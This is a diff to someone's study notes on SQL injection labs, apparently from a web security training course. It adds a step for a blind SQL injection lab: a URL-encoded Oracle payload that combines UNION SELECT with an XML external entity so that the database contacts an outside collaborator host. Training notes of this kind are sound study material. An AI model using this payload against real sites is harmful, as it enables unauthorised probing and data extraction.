@@ -225,4 +225,12 @@ Theory:-  Error-based SQL injection refers to cases where you're able to use err
 
 --------------------------------------------------------------------------------------------------------------------------
 
-#13 Lab: 
+#13 Lab: Blind SQL injection with out-of-band interaction
+
+     1. Intercept the request and send to repeater
+     2. After tracking id append '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//czf5kkjyapahntxra8yqik27nytphf54.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+     3. Send the request and check the oastify.com for any interaction
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+#14 Lab: 
